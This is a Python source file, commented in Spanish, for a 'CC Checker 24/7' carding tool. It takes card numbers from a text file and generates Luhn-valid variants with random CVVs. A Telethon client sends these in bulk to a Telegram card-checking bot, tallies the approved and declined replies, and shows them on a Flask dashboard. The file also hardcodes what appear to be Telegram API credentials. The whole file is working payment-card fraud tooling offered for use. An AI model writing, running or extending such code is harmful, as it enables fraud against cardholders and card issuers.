import threading
import asyncio
import random
import time
import os
from flask import Flask, render_template_string, request, jsonify
from telethon import TelegramClient, events
from telethon.errors import FloodWaitError, RPCError

# ============ CONFIGURACIÓN ============
API_ID = int(os.environ.get('API_ID', '22154650'))
API_HASH = os.environ.get('API_HASH', '2b554e270efb419af271c47ffe1d72d3')
SESSION_NAME = 'session'
CHANNEL_ID = os.environ.get('CHANNEL_ID', 'WsL6AkjchBlNDkx')
PORT = int(os.environ.get('PORT', 5000))

client = TelegramClient(SESSION_NAME, API_ID, API_HASH)

log_messages = []
channelid = CHANNEL_ID
approved_count = 0
declined_count = 0

app = Flask(__name__)

# ============ FUNCIONES UTILITARIAS ============

def luhn_checksum(cardnumber):
    """Algoritmo de Luhn para validar tarjetas"""
    digits = [int(d) for d in str(cardnumber)]
    odd = digits[-1::-2]
    even = digits[-2::-2]
    checksum = sum(odd)
    for d in even:
        checksum += sum([int(x) for x in str(d * 2)])
    return checksum % 10

def generate_luhn_digit(partial_cardnumber):
    """Genera un dígito de verificación válido según Luhn"""
    checksum = 0
    for i, digit in enumerate(reversed(partial_cardnumber)):
        d = int(digit)
        if i % 2 == 0:
            checksum += d
        else:
            checksum += sum([int(x) for x in str(d * 2)])
    return (10 - (checksum % 10)) % 10

def generate_cc_variants(ccbase, count=10):
    """Genera variantes de tarjetas con algoritmo de Luhn"""
    parts = ccbase.strip().split(',')
    if len(parts) >= 3:
        cardnumber = parts[0]
        month = parts[1]
        year = parts[2]
    else:
        cardnumber = ccbase
        month = '12'
        year = '25'

    if len(cardnumber) < 12:
        return []

    base_number = cardnumber[:-4]
    variants = []

    attempts = 0
    while len(variants) < count and attempts < count * 3:
        attempts += 1
        random_digits = str(random.randint(0, 9)) + str(random.randint(0, 9)) + str(random.randint(0, 9))
        partial_number = base_number + random_digits
        luhn_digit = generate_luhn_digit(partial_number)
        complete_number = partial_number + str(luhn_digit)

        if luhn_checksum(complete_number) == 0:
            cvv = random.randint(100, 999)
            variant = f"{complete_number},{month},{year},{cvv}"
            if variant not in variants:
                variants.append(variant)

    return variants

# ============ MANEJADOR DE EVENTOS ============

async def response_handler(event):
    """Maneja respuestas de mensajes aprobados/rechazados"""
    global approved_count, declined_count

    full_message = event.message.message if event.message.message else ""
    message_lower = full_message.lower()

    # Detectar emojis ✅ y ❌, y palabras "approved" o "declined" (case-insensitive)
    if "✅" in full_message or "approved" in message_lower:
        approved_count += 1
        log_messages.append(f"✓ APPROVED: {full_message[:100]}")
    elif "❌" in full_message or "declined" in message_lower:
        declined_count += 1
        log_messages.append(f"✗ DECLINED: {full_message[:100]}")

    # Mantener solo los últimos 100 logs
    if len(log_messages) > 100:
        log_messages.pop(0)

# ============ FUNCIONES DE ENVÍO ============

async def load_commands():
    """Carga comandos desde cmds.txt"""
    try:
        if os.path.exists('cmds.txt'):
            with open('cmds.txt', 'r', encoding='utf-8') as f:
                cmds = [line.strip() for line in f.readlines() if line.strip()]
                if cmds:
                    return cmds
        return ['/check', '/validate', '/test']
    except Exception as e:
        log_messages.append(f"ERROR: Error cargando comandos: {e}")
        return ['/check']

async def send_to_bot():
    """Envía CCs al bot de Telegram"""
    while True:
        try:
            if not os.path.exists('ccs.txt'):
                log_messages.append("INFO: ccs.txt no encontrado. Esperando...")
                await asyncio.sleep(30)
                continue

            with open('ccs.txt', 'r', encoding='utf-8') as f:
                ccs_list = f.readlines()

            if ccs_list:
                current_cc = ccs_list[0].strip()

                if len(ccs_list) > 1:
                    with open('ccs.txt', 'w', encoding='utf-8') as f:
                        f.writelines(ccs_list[1:])
                else:
                    with open('ccs.txt', 'w', encoding='utf-8') as f:
                        f.write("")

                log_messages.append(f"INFO: Generando variantes para {current_cc[:12]}...")
                cc_variants = generate_cc_variants(current_cc, 10)

                if not cc_variants:
                    log_messages.append(f"ERROR: No se pudieron generar variantes")
                    await asyncio.sleep(20)
                    continue

                commands = await load_commands()

                for i in range(0, len(cc_variants), 2):
                    pair = cc_variants[i:i+2]
                    for cc in pair:
                        selected_command = random.choice(commands)
                        message = f"{selected_command} {cc}"
                        try:
                            await client.send_message('@Alphachekerbot', message)
                            log_messages.append(f"✓ Enviado: {cc[:12]}...")
                        except FloodWaitError as e:
                            log_messages.append(f"WARNING: Esperando {e.seconds}s...")
                            await asyncio.sleep(e.seconds)
                        except RPCError as e:
                            log_messages.append(f"ERROR RPC: {e}")

                    await asyncio.sleep(21)
            else:
                log_messages.append("INFO: No hay CCs. Esperando...")
                await asyncio.sleep(20)

        except Exception as e:
            log_messages.append(f"ERROR: {e}")
            await asyncio.sleep(20)

async def start_client():
    """Inicia el cliente de Telegram"""
    try:
        log_messages.append("INFO: Iniciando cliente de Telegram...")
        await client.start()
        log_messages.append("✓ Cliente autenticado correctamente")

        # Escuchar respuestas del bot checker
        client.add_event_handler(response_handler, events.NewMessage(chats='@Alphachekerbot'))

        await asyncio.gather(send_to_bot(), client.run_until_disconnected())
    except Exception as e:
        log_messages.append(f"ERROR: Error al iniciar cliente: {e}")

def telethon_thread_fn():
    """Ejecuta el cliente de Telegram en un hilo separado"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_client())

# ============ RUTAS FLASK ============

@app.route('/')
def index():
    """Panel web principal"""
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>CC Checker 24/7</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { font-family: Arial; margin: 20px; background: #1e1e1e; color: #fff; }
            h2 { color: #4CAF50; }
            pre { background: #2d2d2d; padding: 10px; border-radius: 5px; max-height: 400px; overflow-y: auto; font-size: 12px; }
            input { padding: 8px; width: 300px; }
            button { padding: 8px 20px; background: #4CAF50; color: white; border: none; border-radius: 3px; cursor: pointer; }
            button:hover { background: #45a049; }
            .stats { margin: 20px 0; }
            .stat { display: inline-block; margin-right: 30px; font-size: 18px; }
        </style>
    </head>
    <body>
        <h2>🤖 CC Checker - Panel 24/7</h2>
        <div class="stats">
            <div class="stat">✓ Aprobadas: <b>{{ approved }}</b></div>
            <div class="stat">✗ Rechazadas: <b>{{ declined }}</b></div>
        </div>
        <h3>Cambiar Canal</h3>
        <form action="/set_channel" method="post">
            <input type="text" name="channel" placeholder="Ej: @canal o ID o enlace t.me/..."/>
            <button type="submit">Actualizar Canal</button>
        </form>
        <h3>Logs en Vivo</h3>
        <pre id="logs">{{ log }}</pre>
        <script>
            setInterval(function() {
                fetch('/get_logs').then(r => r.json()).then(data => {
                    document.getElementById('logs').innerText = data.log;
                });
            }, 3000);
        </script>
    </body>
    </html>
    '''
    return render_template_string(html, log='\n'.join(log_messages[-50:]), approved=approved_count, declined=declined_count)

@app.route('/set_channel', methods=['POST'])
def set_channel():
    """Cambia el canal de destino"""
    global channelid
    new_channel = request.form.get('channel')
    channelid = new_channel
    log_messages.append(f"✓ Canal actualizado a {channelid}")
    return jsonify({"ok": True, "message": f"Canal actualizado a {channelid}"})

@app.route('/get_logs')
def get_logs():
    """Obtiene los logs actuales en JSON"""
    return jsonify({"log": '\n'.join(log_messages[-50:]), "approved": approved_count, "declined": declined_count})

@app.route('/health')
def health():
    """Health check para Railway"""
    return jsonify({"status": "ok", "approved": approved_count, "declined": declined_count})

# ============ INICIO ============

if __name__ == '__main__':
    # Iniciar Telethon en hilo separado
    telethon_thread = threading.Thread(target=telethon_thread_fn, daemon=True)
    telethon_thread.start()
    time.sleep(2)

    # Iniciar Flask
    app.run('0.0.0.0', PORT, debug=False)
